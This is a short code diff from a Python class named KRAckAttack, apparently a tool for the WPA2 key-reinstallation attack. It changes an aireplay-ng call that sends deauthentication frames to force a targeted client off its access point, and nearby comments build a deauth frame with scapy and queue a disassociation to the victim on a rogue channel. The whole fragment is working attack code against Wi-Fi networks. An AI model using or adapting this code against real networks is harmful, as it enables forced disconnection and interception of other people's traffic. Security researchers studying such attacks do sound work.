@@ -859,7 +859,7 @@ class KRAckAttack():
 		# 	dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
 		# 	deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		# 	self.sock_real.send(deauth)
-		subprocess.call(["aireplay-ng", "--deauth 10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_clientack], shell=True)
+		subprocess.call(["aireplay-ng", "-0 10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_clientack, self.nic_real_mon], shell=True)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
 		if self.clientmac:
